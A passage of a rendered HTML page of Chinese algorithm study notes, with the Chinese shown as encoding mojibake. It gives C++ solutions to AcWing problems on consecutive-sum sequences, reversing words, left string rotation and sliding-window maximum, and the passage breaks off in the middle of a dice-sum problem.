class="mord">1000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š15è¾“å‡ºï¼š[[1,2,3,4,5],[4,5,6],[7,8]]</code></pre><h3 id="åŒæŒ‡é’ˆ">åŒæŒ‡é’ˆ</h3><blockquote><p>å¾ˆå¤šæƒ…å†µä¸‹ï¼ŒåŒæŒ‡é’ˆå’Œé˜Ÿåˆ—æ˜¯ç­‰ä»·çš„ã€‚<br>ç”±äº<strong>queueä¸æ”¯æŒéå†</strong>ï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æ˜¯ç”¨åŒæŒ‡é’ˆå§ã€‚</p></blockquote><p>åˆ†åˆ«ç”¨iå’Œjè¡¨ç¤ºè¿ç»­åºåˆ—çš„èµ·æ­¢ä½ç½®<br>å¦‚æœé‡‡ç”¨æš´åŠ›æ–¹æ³•æšä¸¾iå’Œj, åˆ™æ—¶é—´å¤æ‚åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><br>è‹¥åˆ©ç”¨è§„å¾‹: å½“jå³ç§»æ—¶(åŠ æ•°ä¸ªæ•°å¢åŠ ), iä¸€å®šä¹Ÿä¼šå³ç§», åˆ™å¯å†™å‡ºæ—¶é—´å¤æ‚åº¦ä¸ºO(n)çš„ç®—æ³•</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt; &gt; <span class="built_in">findContinuousSequence</span>(<span class="type">int</span> sum) &#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; path;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">1</span>, s = <span class="number">0</span>; j &lt;= sum / <span class="number">2</span> + <span class="number">1</span>; j++) &#123;</span><br><span class="line">      s += j;</span><br><span class="line">      <span class="keyword">while</span> (s &gt; sum) &#123;</span><br><span class="line">        s -= i;</span><br><span class="line">        i++;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (s == sum &amp;&amp; j - i + <span class="number">1</span> &gt;= <span class="number">2</span>) &#123;  <span class="comment">// è‡³å°‘2ä¸ªå…ƒç´ </span></span><br><span class="line">        path.<span class="built_in">clear</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> k = i; k &lt;= j; k++) path.<span class="built_in">push_back</span>(k);</span><br><span class="line">        res.<span class="built_in">push_back</span>(path);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="ç¿»è½¬å•è¯é¡ºåº"><a href="https://www.acwing.com/problem/content/73/">ç¿»è½¬å•è¯é¡ºåº</a></h2><p>è¾“å…¥ä¸€ä¸ªè‹±æ–‡å¥å­ï¼Œ<strong>å•è¯ä¹‹é—´ç”¨ä¸€ä¸ªç©ºæ ¼éš”å¼€ï¼Œä¸”å¥é¦–å’Œå¥å°¾æ²¡æœ‰å¤šä½™ç©ºæ ¼</strong>ã€‚</p><p>ç¿»è½¬å¥å­ä¸­å•è¯çš„é¡ºåºï¼Œä½†å•è¯å†…å­—ç¬¦çš„é¡ºåºä¸å˜ã€‚</p><p>ä¸ºç®€å•èµ·è§ï¼Œæ ‡ç‚¹ç¬¦å·å’Œæ™®é€šå­—æ¯ä¸€æ ·å¤„ç†ã€‚</p><p>ä¾‹å¦‚è¾“å…¥å­—ç¬¦ä¸²<code>&quot;I am a student.&quot;</code>ï¼Œåˆ™è¾“å‡º<code>&quot;student. a am I&quot;</code>ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š&quot;I am a student.&quot;è¾“å‡ºï¼š&quot;student. a am I&quot;</code></pre><h3 id="ä¸¤æ¬¡reverseç¿»è½¬">ä¸¤æ¬¡reverseç¿»è½¬</h3><ol><li>reverse()å‡½æ•°ç¿»è½¬æ•´ä½“</li><li>å¿«æ…¢æŒ‡é’ˆåˆ†å‰²å‡ºå•è¯, å†æŠŠå•è¯ç¿»è½¬å›æ¥</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="type">int</span> j = i;</span><br><span class="line">      <span class="keyword">while</span> (j &lt; s.<span class="built_in">size</span>() &amp;&amp; s[j] != <span class="string">&#x27; &#x27;</span>) j++;</span><br><span class="line">      <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>() + i, s.<span class="built_in">begin</span>() + j);  <span class="comment">// å‰å¼€åé—­</span></span><br><span class="line">      i = j;  <span class="comment">// i++åèµ°åˆ°ç©ºæ ¼å</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ”¹ç¼–-ç¿»è½¬å•è¯é¡ºåº">æ”¹ç¼– ç¿»è½¬å•è¯é¡ºåº</h2><p>ä¸ä¸Šä¸€é¢˜ä¸åŒçš„æ˜¯æ¯ä¸ªå•è¯å‰åéƒ½æœ‰æ•°é‡ä¸å®šçš„ç©ºæ ¼ï¼ŒåŒ…æ‹¬æ•´ä¸ªå¥å­çš„å‰åä¹Ÿå¯èƒ½æœ‰ä¸€å®šçš„ç©ºæ ¼ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥: &quot; Â hello   world! Â &quot;</span><br><span class="line">è¾“å‡º:Â &quot;world! hello&quot;</span><br><span class="line">è§£é‡Š: è¾“å…¥å­—ç¬¦ä¸²å¯ä»¥åœ¨å‰é¢æˆ–è€…åé¢åŒ…å«å¤šä½™çš„ç©ºæ ¼ï¼Œä½†æ˜¯åè½¬åçš„å­—ç¬¦ä¸èƒ½åŒ…æ‹¬ã€‚</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ä»£ç ">ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">reverseWords</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, n = s.<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> start = <span class="number">0</span>; start &lt; n; start++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (s[start] != <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (idx != <span class="number">0</span>) s[idx++] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="type">int</span> end = start;</span><br><span class="line">        <span class="keyword">while</span> (end &lt; n &amp;&amp; s[end] != <span class="string">&#x27; &#x27;</span>) s[idx++] = s[end++];</span><br><span class="line">        <span class="built_in">reverse</span>(s.<span class="built_in">begin</span>() + idx - (end - start), s.<span class="built_in">begin</span>() + idx);</span><br><span class="line">        start = end;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    s.<span class="built_in">erase</span>(s.<span class="built_in">begin</span>() + idx, s.<span class="built_in">end</span>());  <span class="comment">// s.erase</span></span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å·¦æ—‹è½¬å­—ç¬¦ä¸²"><a href="https://www.acwing.com/problem/content/74/">å·¦æ—‹è½¬å­—ç¬¦ä¸²</a></h2><p>å­—ç¬¦ä¸²çš„å·¦æ—‹è½¬æ“ä½œæ˜¯æŠŠå­—ç¬¦ä¸²å‰é¢çš„è‹¥å¹²ä¸ªå­—ç¬¦è½¬ç§»åˆ°å­—ç¬¦ä¸²çš„å°¾éƒ¨ã€‚</p><p>è¯·å®šä¹‰ä¸€ä¸ªå‡½æ•°å®ç°å­—ç¬¦ä¸²å·¦æ—‹è½¬æ“ä½œçš„åŠŸèƒ½ã€‚</p><p>æ¯”å¦‚è¾“å…¥å­—ç¬¦ä¸²<code>&quot;abcdefg&quot;</code>å’Œæ•°å­— <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>ï¼Œè¯¥å‡½æ•°å°†è¿”å›å·¦æ—‹è½¬ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> ä½å¾—åˆ°çš„ç»“æœ<code>&quot;cdefgab&quot;</code>ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>æ•°æ®ä¿è¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> å°äºç­‰äºè¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š&quot;abcdefg&quot; , n=2è¾“å‡ºï¼š&quot;cdefgab&quot;</code></pre><h3 id="é¢˜è§£-12">é¢˜è§£</h3><p>æœ¬è´¨å’Œ&quot;ç¿»è½¬å¥å­, å•è¯ä¸ç¿»è½¬&quot;ç›¸åŒ: æŠŠå‰åä¸¤éƒ¨åˆ†çœ‹ä½œä¸¤ä¸ªå•è¯ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">string <span class="title">leftRotateString</span><span class="params">(string str, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">reverse</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">reverse</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>() - n);</span><br><span class="line">    <span class="built_in">reverse</span>(str.<span class="built_in">end</span>() - n, str.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> str;  <span class="comment">// æŠ¥segament faultå¯èƒ½æ˜¯å› ä¸ºæ²¡å†™return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="Week-7">Week 7</h1><h2 id="æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼â˜…"><a href="https://www.acwing.com/problem/content/75/">æ»‘åŠ¨çª—å£çš„æœ€å¤§å€¼â˜…</a></h2><p>ç»™å®šä¸€ä¸ªæ•°ç»„å’Œæ»‘åŠ¨çª—å£çš„å¤§å°ï¼Œè¯·æ‰¾å‡ºæ‰€æœ‰æ»‘åŠ¨çª—å£é‡Œçš„æœ€å¤§å€¼ã€‚</p><p>ä¾‹å¦‚ï¼Œå¦‚æœè¾“å…¥æ•°ç»„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mn>3</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mn>5</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[2, 3, 4, 2, 6, 2, 5, 1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> åŠæ»‘åŠ¨çª—å£çš„å¤§å° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span>ï¼Œé‚£ä¹ˆä¸€å…±å­˜åœ¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>6</mn></mrow><annotation encoding="application/x-tex">6</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span></span></span></span> ä¸ªæ»‘åŠ¨çª—å£ï¼Œå®ƒä»¬çš„æœ€å¤§å€¼åˆ†åˆ«ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>4</mn><mo separator="true">,</mo><mn>4</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>6</mn><mo separator="true">,</mo><mn>5</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[4, 4, 6, 6, 6, 5]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">5</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>æ•°æ®ä¿è¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> å¤§äº <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">0</span></span></span></span>ï¼Œä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> å°äºç­‰äºæ•°ç»„é•¿åº¦ã€‚</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[2, 3, 4, 2, 6, 2, 5, 1] , k=3è¾“å‡º: [4, 4, 6, 6, 6, 5]</code></pre><h3 id="åŒå‘å•è°ƒé€’å‡é˜Ÿåˆ—">åŒå‘å•è°ƒé€’å‡é˜Ÿåˆ—</h3><p>æ—¶é—´å¤æ‚åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>, æ¯ä¸ªå…ƒç´ éƒ½ä¼šå…¥é˜Ÿä¸€æ¬¡, æœ€å¤šå‡ºé˜Ÿä¸€æ¬¡ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">maxInWindows</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    deque&lt;<span class="type">int</span>&gt; q;  <span class="comment">// dequeç»´æŠ¤æ»‘åŠ¨çª—å£(é˜Ÿåˆ—), å…ƒç´ æ˜¯ä¸‹æ ‡</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="comment">// ä¿è¯æ˜¯é€’å‡é˜Ÿåˆ—ï¼ˆæ—©è¿›å…¥ä¸”å°çš„æ•°å­—â€œæ°¸æ— å‡ºå¤´ä¹‹æ—¥â€ï¼‰</span></span><br><span class="line">      <span class="keyword">while</span> (q.<span class="built_in">size</span>() &amp;&amp; nums[q.<span class="built_in">back</span>()] &lt;= nums[i]) q.<span class="built_in">pop_back</span>();</span><br><span class="line">      q.<span class="built_in">push_back</span>(i);</span><br><span class="line">      <span class="keyword">if</span> (q.<span class="built_in">size</span>() &amp;&amp; i - q.<span class="built_in">front</span>() + <span class="number">1</span> &gt; k) q.<span class="built_in">pop_front</span>();</span><br><span class="line">      <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) res.<span class="built_in">push_back</span>(nums[q.<span class="built_in">front</span>()]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="éª°å­çš„ç‚¹æ•°â˜…"><a href="https://www.acwing.com/problem/content/76/">éª°å­çš„ç‚¹æ•°â˜…</a></h2><p>å°†ä¸€ä¸ªéª°å­æŠ•æ· <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> æ¬¡ï¼Œè·å¾—çš„æ€»ç‚¹æ•°ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span>ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span> çš„å¯èƒ½èŒƒå›´ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ¼</mo><mn>6</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">n \sim 6n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mord mathnormal">n</span></span></span></span>ã€‚</p><p>æ·å‡ºæŸä¸€ç‚¹æ•°ï¼Œå¯èƒ½æœ‰å¤šç§æ·æ³•ï¼Œä¾‹å¦‚æŠ•æ· <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn></mrow><annotation encoding="application/x-tex">2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span> æ¬¡ï¼Œæ·å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn></mrow><annotation encoding="application/x-tex">3</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">3</span></span></span></span> ç‚¹ï¼Œå…±æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo stretchy="false">]</mo><mo separator="true">,</mo><mo stretchy="false">[</mo><mn>2</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,2],[2,1]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mopen">[</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1</span><span class="mclose">]</span></span></span></span> ä¸¤ç§æ·æ³•ã€‚</p><p>è¯·æ±‚å‡ºæŠ•æ· <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> æ¬¡ï¼Œæ·å‡º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mo>âˆ¼</mo><mn>6</mn><mi>n</mi></mrow><annotation encoding="application/x-tex">n \sim 6n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">âˆ¼</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">6</span><span class="mord mathnormal">n</span></span></span></span> ç‚¹åˆ†åˆ«æœ‰å¤šå°‘ç§æ·æ³•ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">1 \le n \le 10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span 